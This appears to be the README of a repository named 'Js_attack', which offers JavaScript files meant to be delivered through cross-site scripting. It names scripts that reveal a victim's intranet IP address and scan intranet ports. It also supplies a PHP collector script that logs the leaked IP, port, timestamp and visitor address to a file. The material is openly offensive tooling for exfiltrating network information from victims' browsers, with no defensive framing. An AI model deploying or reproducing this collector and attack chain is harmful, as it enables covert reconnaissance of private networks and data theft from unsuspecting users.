Js_attack - some .jS with xss to attack
===================

Usage example
------------------

Get-Intranet-ip.js & Scan-Intranet-port.js: 
you can make a server to accept ip and port:
```
<?php
    date_default_timezone_set(PRC);
    $from = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d G:i:s");
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    file_put_contents('./webrtc_ip.txt', $ip.' | '.$port.' | '.$time.' | from '.$from."\r\n", FILE_APPEND);
?>
```


Credit
------
Repo is based on the following projects:

- https://github.com/diafygi/webrtc-ips


